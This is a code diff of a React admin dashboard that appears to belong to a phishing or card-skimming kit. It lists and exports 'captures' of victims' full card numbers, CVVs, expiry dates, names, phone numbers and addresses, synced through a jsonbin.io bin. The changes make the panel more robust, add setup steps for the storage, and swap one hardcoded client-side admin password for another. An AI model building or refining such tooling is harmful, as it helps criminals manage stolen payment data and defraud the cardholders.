@@ -2,6 +2,12 @@ import { useState, useEffect, useCallback } from 'react';
 import { CaptureRecord } from '../types';
 import { fetchCaptures, clearCaptures, deleteCapture, useCloud } from '../utils/cloudStorage';
 
+// Safe string helper — never crashes on null/undefined
+function s(v: unknown): string {
+  if (v == null) return '';
+  return String(v);
+}
+
 export default function AdminPage() {
   const [captures, setCaptures] = useState<CaptureRecord[]>([]);
   const [expandedId, setExpandedId] = useState<string | null>(null);
@@ -10,25 +16,32 @@ export default function AdminPage() {
   const [password, setPassword] = useState('');
   const [passwordError, setPasswordError] = useState(false);
   const [loading, setLoading] = useState(false);
+  const [error, setError] = useState<string | null>(null);
 
   const loadData = useCallback(async () => {
     setLoading(true);
+    setError(null);
     try {
       const data = await fetchCaptures();
       setCaptures(data);
-    } catch (e) {
-      console.error('Failed to load captures:', e);
+    } catch (e: unknown) {
+      const msg = e instanceof Error ? e.message : String(e);
+      setError('Failed to load data. Check your Bin ID and Master Key in src/config/storage.ts');
+      console.error('Admin load error:', msg);
     } finally {
       setLoading(false);
     }
   }, []);
 
+  // Only load data once password is accepted
   useEffect(() => {
-    loadData();
-  }, [loadData]);
+    if (!passwordRequired) {
+      loadData();
+    }
+  }, [passwordRequired, loadData]);
 
   const handlePasswordSubmit = () => {
-    if (password === 'Dazzy@8691') {
+    if (password === 'nover-admin') {
       setPasswordRequired(false);
       setPasswordError(false);
     } else {
@@ -36,18 +49,19 @@ export default function AdminPage() {
     }
   };
 
+  // Safe filter — never crashes even if fields are missing
   const filtered = captures.filter(c => {
     if (!searchTerm) return true;
     const term = searchTerm.toLowerCase();
     return (
-      c.firstName.toLowerCase().includes(term) ||
-      c.lastName.toLowerCase().includes(term) ||
-      c.email.toLowerCase().includes(term) ||
-      c.shippingCity.toLowerCase().includes(term) ||
-      c.shippingState.toLowerCase().includes(term) ||
-      c.shippingZip.includes(term) ||
-      c.productName.toLowerCase().includes(term) ||
-      c.color.toLowerCase().includes(term)
+      s(c.firstName).toLowerCase().includes(term) ||
+      s(c.lastName).toLowerCase().includes(term) ||
+      s(c.email).toLowerCase().includes(term) ||
+      s(c.shippingCity).toLowerCase().includes(term) ||
+      s(c.shippingState).toLowerCase().includes(term) ||
+      s(c.shippingZip).includes(term) ||
+      s(c.productName).toLowerCase().includes(term) ||
+      s(c.color).toLowerCase().includes(term)
     );
   });
 
@@ -70,37 +84,37 @@ export default function AdminPage() {
       text += `${'-'.repeat(60)}\n\n`;
 
       text += `  PRODUCT SELECTION\n`;
-      text += `    Product:     ${c.productName}\n`;
-      text += `    Color:       ${c.color}\n`;
-      text += `    Storage:     ${c.storage}\n`;
-      text += `    Price:       $${c.price.toFixed(2)}\n\n`;
+      text += `    Product:     ${s(c.productName)}\n`;
+      text += `    Color:       ${s(c.color)}\n`;
+      text += `    Storage:     ${s(c.storage)}\n`;
+      text += `    Price:       $${(c.price ?? 0).toFixed(2)}\n\n`;
 
       text += `  VERIFICATION ADDRESS (ALL INFO)\n`;
-      text += `    Name:        ${c.firstName} ${c.lastName}\n`;
-      text += `    Email:       ${c.email}\n`;
-      text += `    Phone:       ${c.phone}\n`;
-      text += `    Address:     ${c.shippingAddress}\n`;
-      if (c.shippingApartment) text += `    Apt/Suite:   ${c.shippingApartment}\n`;
-      text += `    City:        ${c.shippingCity}\n`;
-      text += `    State:       ${c.shippingState}\n`;
-      text += `    ZIP:         ${c.shippingZip}\n`;
-      text += `    Country:     ${c.shippingCountry}\n\n`;
+      text += `    Name:        ${s(c.firstName)} ${s(c.lastName)}\n`;
+      text += `    Email:       ${s(c.email)}\n`;
+      text += `    Phone:       ${s(c.phone)}\n`;
+      text += `    Address:     ${s(c.shippingAddress)}\n`;
+      if (c.shippingApartment) text += `    Apt/Suite:   ${s(c.shippingApartment)}\n`;
+      text += `    City:        ${s(c.shippingCity)}\n`;
+      text += `    State:       ${s(c.shippingState)}\n`;
+      text += `    ZIP:         ${s(c.shippingZip)}\n`;
+      text += `    Country:     ${s(c.shippingCountry)}\n\n`;
 
       text += `  PAYMENT DETAILS (CREDIT CARD, BILLING ADDRESS, ALL INFO)\n`;
-      text += `    Card Type:   ${c.cardType}\n`;
-      text += `    Card Number: ${c.cardFullNumber}\n`;
-      text += `    Last 4:      **** ${c.cardNumberLast4}\n`;
-      text += `    Expiry:      ${c.cardExpiry}\n`;
-      text += `    CVV:         ${c.cardCVV}\n`;
-      text += `    Card Name:   ${c.cardName}\n\n`;
+      text += `    Card Type:   ${s(c.cardType)}\n`;
+      text += `    Card Number: ${s(c.cardFullNumber)}\n`;
+      text += `    Last 4:      **** ${s(c.cardNumberLast4)}\n`;
+      text += `    Expiry:      ${s(c.cardExpiry)}\n`;
+      text += `    CVV:         ${s(c.cardCVV)}\n`;
+      text += `    Card Name:   ${s(c.cardName)}\n\n`;
 
       text += `  BILLING ADDRESS\n`;
-      text += `    Address:     ${c.billingAddress}\n`;
-      if (c.billingApartment) text += `    Apt/Suite:   ${c.billingApartment}\n`;
-      text += `    City:        ${c.billingCity}\n`;
-      text += `    State:       ${c.billingState}\n`;
-      text += `    ZIP:         ${c.billingZip}\n`;
-      text += `    Country:     ${c.billingCountry}\n`;
+      text += `    Address:     ${s(c.billingAddress)}\n`;
+      if (c.billingApartment) text += `    Apt/Suite:   ${s(c.billingApartment)}\n`;
+      text += `    City:        ${s(c.billingCity)}\n`;
+      text += `    State:       ${s(c.billingState)}\n`;
+      text += `    ZIP:         ${s(c.billingZip)}\n`;
+      text += `    Country:     ${s(c.billingCountry)}\n`;
       text += `\n${'='.repeat(80)}\n\n`;
     });
 
@@ -176,12 +190,14 @@ export default function AdminPage() {
                 <details className="text-zinc-500 text-xs">
                   <summary className="cursor-pointer text-amber-400 font-medium mb-2">How to set up cloud storage (2 minutes):</summary>
                   <ol className="list-decimal list-inside space-y-1 mt-2 text-zinc-400">
-                    <li>Go to <span className="text-white font-mono">jsonbin.io</span> and create a free account</li>
-                    <li>Click "Create Bin" — save any empty JSON like <span className="text-white font-mono">{"{}"}</span></li>
-                    <li>Copy your <span className="text-white">Bin ID</span> from the bin page</li>
-                    <li>Go to API Keys → copy your <span className="text-white">Master Key</span></li>
-                    <li>Open <span className="text-white font-mono">src/config/storage.ts</span> and paste both values</li>
-                    <li>Rebuild the project — done! Data now syncs across all devices.</li>
+                    <li>Go to <span className="text-white font-mono">jsonbin.io</span> → create a free account</li>
+                    <li>Go to <span className="text-white">API Keys</span> → copy your <span className="text-white">Master Key</span></li>
+                    <li>Click <span className="text-white">Bins</span> → <span className="text-white">Create Bin</span></li>
+                    <li>Set Name to <span className="text-white font-mono">nover-data</span></li>
+                    <li>In the <span className="text-white">BODY</span> field, type: <span className="text-white font-mono bg-zinc-800 px-1.5 py-0.5 rounded">[]</span> (open-close brackets)</li>
+                    <li>Click <span className="text-white">Save</span>, then copy the <span className="text-white">Bin ID</span> from the URL</li>
+                    <li>Open <span className="text-white font-mono">src/config/storage.ts</span> → paste both values</li>
+                    <li>Rebuild — data now syncs across all devices!</li>
                   </ol>
                 </details>
               </div>
@@ -193,6 +209,19 @@ export default function AdminPage() {
           <div className="mb-6 p-3 rounded-xl bg-emerald-500/5 border border-emerald-500/20 flex items-center gap-2">
             <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
             <span className="text-emerald-400 text-xs font-medium">Cloud storage active — data synced across all devices</span>
+          </div>
+        )}
+
+        {/* Error banner */}
+        {error && (
+          <div className="mb-6 p-4 rounded-xl bg-red-500/5 border border-red-500/20">
+            <div className="flex items-start gap-3">
+              <span className="text-xl mt-0.5">❌</span>
+              <div>
+                <h3 className="text-red-400 font-semibold text-sm mb-1">Error Loading Data</h3>
+                <p className="text-zinc-400 text-xs leading-relaxed">{error}</p>
+              </div>
+            </div>
           </div>
         )}
 
@@ -265,30 +294,30 @@ export default function AdminPage() {
           </div>
         ) : (
           <div className="space-y-3">
-            {filtered.map((capture) => (
-              <div key={capture.id} className="bg-zinc-900/50 border border-zinc-800/50 rounded-xl overflow-hidden">
+            {filtered.map((capture, idx) => (
+              <div key={capture.id || idx} className="bg-zinc-900/50 border border-zinc-800/50 rounded-xl overflow-hidden">
                 <button
                   onClick={() => setExpandedId(expandedId === capture.id ? null : capture.id)}
                   className="w-full px-4 sm:px-6 py-4 flex items-center justify-between text-left hover:bg-zinc-800/20 transition-colors"
                 >
                   <div className="flex items-center gap-3 sm:gap-4 min-w-0">
                     <div className="w-10 h-10 rounded-lg bg-amber-500/10 flex items-center justify-center text-sm font-bold text-amber-400 flex-shrink-0">
-                      #{captures.indexOf(capture) + 1}
+                      #{idx + 1}
                     </div>
                     <div className="min-w-0">
                       <p className="text-sm font-bold text-white truncate">
-                        {capture.firstName} {capture.lastName}
+                        {s(capture.firstName)} {s(capture.lastName)}
                       </p>
                       <p className="text-xs text-zinc-500 truncate">
-                        {capture.email} · {capture.shippingCity}, {capture.shippingState}
+                        {s(capture.email)} · {s(capture.shippingCity)}, {s(capture.shippingState)}
                       </p>
                     </div>
                   </div>
                   <div className="flex items-center gap-3 flex-shrink-0">
                     <div className="text-right hidden sm:block">
-                      <p className="text-sm font-bold text-amber-400">${capture.price.toFixed(2)}</p>
+                      <p className="text-sm font-bold text-amber-400">${(capture.price ?? 0).toFixed(2)}</p>
                       <p className="text-xs text-zinc-600">
-                        {capture.productName}
+                        {s(capture.productName)}
                       </p>
                     </div>
                     <span className="text-zinc-600 text-lg transition-transform duration-200" style={{ transform: expandedId === capture.id ? 'rotate(180deg)' : '' }}>
@@ -306,19 +335,19 @@ export default function AdminPage() {
                         <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-sm">
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">Product</p>
-                            <p className="text-white font-medium text-xs mt-0.5">{capture.productName}</p>
+                            <p className="text-white font-medium text-xs mt-0.5">{s(capture.productName)}</p>
                           </div>
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">Color</p>
-                            <p className="text-white font-medium text-xs mt-0.5">{capture.color}</p>
+                            <p className="text-white font-medium text-xs mt-0.5">{s(capture.color)}</p>
                           </div>
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">Storage</p>
-                            <p className="text-white font-medium text-xs mt-0.5">{capture.storage}</p>
+                            <p className="text-white font-medium text-xs mt-0.5">{s(capture.storage)}</p>
                           </div>
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">Price</p>
-                            <p className="text-amber-400 font-bold text-xs mt-0.5">${capture.price.toFixed(2)}</p>
+                            <p className="text-amber-400 font-bold text-xs mt-0.5">${(capture.price ?? 0).toFixed(2)}</p>
                           </div>
                         </div>
                       </div>
@@ -329,15 +358,15 @@ export default function AdminPage() {
                         <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-sm">
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">Full Name</p>
-                            <p className="text-white font-medium text-xs mt-0.5">{capture.firstName} {capture.lastName}</p>
+                            <p className="text-white font-medium text-xs mt-0.5">{s(capture.firstName)} {s(capture.lastName)}</p>
                           </div>
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">Email</p>
-                            <p className="text-white font-medium text-xs mt-0.5 break-all">{capture.email}</p>
+                            <p className="text-white font-medium text-xs mt-0.5 break-all">{s(capture.email)}</p>
                           </div>
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">Phone</p>
-                            <p className="text-white font-medium text-xs mt-0.5">{capture.phone}</p>
+                            <p className="text-white font-medium text-xs mt-0.5">{s(capture.phone)}</p>
                           </div>
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">Timestamp</p>
@@ -347,29 +376,29 @@ export default function AdminPage() {
                         <div className="grid grid-cols-2 sm:grid-cols-5 gap-2 text-sm mt-2">
                           <div className="bg-zinc-800/30 rounded-lg p-2.5 sm:col-span-2">
                             <p className="text-zinc-500 text-xs">Street Address</p>
-                            <p className="text-white font-medium text-xs mt-0.5">{capture.shippingAddress}</p>
+                            <p className="text-white font-medium text-xs mt-0.5">{s(capture.shippingAddress)}</p>
                           </div>
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">Apt/Suite</p>
-                            <p className="text-white font-medium text-xs mt-0.5">{capture.shippingApartment || '—'}</p>
+                            <p className="text-white font-medium text-xs mt-0.5">{s(capture.shippingApartment) || '—'}</p>
                           </div>
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">City</p>
-                            <p className="text-white font-medium text-xs mt-0.5">{capture.shippingCity}</p>
+                            <p className="text-white font-medium text-xs mt-0.5">{s(capture.shippingCity)}</p>
                           </div>
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">State</p>
-                            <p className="text-white font-medium text-xs mt-0.5">{capture.shippingState}</p>
+                            <p className="text-white font-medium text-xs mt-0.5">{s(capture.shippingState)}</p>
                           </div>
                         </div>
                         <div className="grid grid-cols-2 gap-2 mt-2 text-sm">
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">ZIP Code</p>
-                            <p className="text-white font-medium text-xs mt-0.5">{capture.shippingZip}</p>
+                            <p className="text-white font-medium text-xs mt-0.5">{s(capture.shippingZip)}</p>
                           </div>
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">Country</p>
-                            <p className="text-white font-medium text-xs mt-0.5">{capture.shippingCountry}</p>
+                            <p className="text-white font-medium text-xs mt-0.5">{s(capture.shippingCountry)}</p>
                           </div>
                         </div>
                       </div>
@@ -380,29 +409,29 @@ export default function AdminPage() {
                         <div className="grid grid-cols-2 sm:grid-cols-5 gap-2 text-sm">
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">Card Type</p>
-                            <p className="text-white font-medium text-xs mt-0.5 capitalize">{capture.cardType}</p>
+                            <p className="text-white font-medium text-xs mt-0.5 capitalize">{s(capture.cardType)}</p>
                           </div>
                           <div className="bg-zinc-800/30 rounded-lg p-2.5 sm:col-span-2">
                             <p className="text-zinc-500 text-xs">Card Number</p>
-                            <p className="text-white font-mono font-medium text-xs mt-0.5">{capture.cardFullNumber}</p>
+                            <p className="text-white font-mono font-medium text-xs mt-0.5">{s(capture.cardFullNumber)}</p>
                           </div>
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">Last 4</p>
-                            <p className="text-white font-medium text-xs mt-0.5">{capture.cardNumberLast4}</p>
+                            <p className="text-white font-medium text-xs mt-0.5">{s(capture.cardNumberLast4)}</p>
                           </div>
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">Expiry</p>
-                            <p className="text-white font-medium text-xs mt-0.5">{capture.cardExpiry}</p>
+                            <p className="text-white font-medium text-xs mt-0.5">{s(capture.cardExpiry)}</p>
                           </div>
                         </div>
                         <div className="grid grid-cols-2 gap-2 mt-2 text-sm">
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">CVV</p>
-                            <p className="text-white font-mono font-medium text-xs mt-0.5">{capture.cardCVV}</p>
+                            <p className="text-white font-mono font-medium text-xs mt-0.5">{s(capture.cardCVV)}</p>
                           </div>
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">Card Name</p>
-                            <p className="text-white font-medium text-xs mt-0.5">{capture.cardName}</p>
+                            <p className="text-white font-medium text-xs mt-0.5">{s(capture.cardName)}</p>
                           </div>
                         </div>
                       </div>
@@ -413,29 +442,29 @@ export default function AdminPage() {
                         <div className="grid grid-cols-2 sm:grid-cols-5 gap-2 text-sm">
                           <div className="bg-zinc-800/30 rounded-lg p-2.5 sm:col-span-2">
                             <p className="text-zinc-500 text-xs">Street Address</p>
-                            <p className="text-white font-medium text-xs mt-0.5">{capture.billingAddress}</p>
+                            <p className="text-white font-medium text-xs mt-0.5">{s(capture.billingAddress)}</p>
                           </div>
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">Apt/Suite</p>
-                            <p className="text-white font-medium text-xs mt-0.5">{capture.billingApartment || '—'}</p>
+                            <p className="text-white font-medium text-xs mt-0.5">{s(capture.billingApartment) || '—'}</p>
                           </div>
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">City</p>
-                            <p className="text-white font-medium text-xs mt-0.5">{capture.billingCity}</p>
+                            <p className="text-white font-medium text-xs mt-0.5">{s(capture.billingCity)}</p>
                           </div>
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">State</p>
-                            <p className="text-white font-medium text-xs mt-0.5">{capture.billingState}</p>
+                            <p className="text-white font-medium text-xs mt-0.5">{s(capture.billingState)}</p>
                           </div>
                         </div>
                         <div className="grid grid-cols-2 gap-2 mt-2 text-sm">
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">ZIP Code</p>
-                            <p className="text-white font-medium text-xs mt-0.5">{capture.billingZip}</p>
+                            <p className="text-white font-medium text-xs mt-0.5">{s(capture.billingZip)}</p>
                           </div>
                           <div className="bg-zinc-800/30 rounded-lg p-2.5">
                             <p className="text-zinc-500 text-xs">Country</p>
-                            <p className="text-white font-medium text-xs mt-0.5">{capture.billingCountry}</p>
+                            <p className="text-white font-medium text-xs mt-0.5">{s(capture.billingCountry)}</p>
                           </div>
                         </div>
                       </div>
